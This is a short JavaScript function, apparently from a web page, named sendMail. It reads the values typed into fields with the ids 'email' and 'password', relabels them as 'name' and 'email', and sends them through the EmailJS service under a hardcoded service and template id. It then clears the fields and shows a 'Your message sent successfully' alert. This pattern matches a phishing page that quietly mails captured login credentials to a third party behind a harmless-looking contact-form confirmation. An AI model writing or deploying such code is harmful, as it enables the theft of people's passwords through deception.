function sendMail() {
    var params = {
      name: document.getElementById("email").value,
      email: document.getElementById("password").value,
    };
  
    const serviceID = "service_h4hxmmb";
    const templateID = "template_xyfd3pw";
  
      emailjs.send(serviceID, templateID, params)
      .then(res=>{
          document.getElementById("email").value = "";
          document.getElementById("password").value = "";
          console.log(res);
          alert("Your message sent successfully!!")
  
      })
      .catch(err=>console.log(err));
  
  }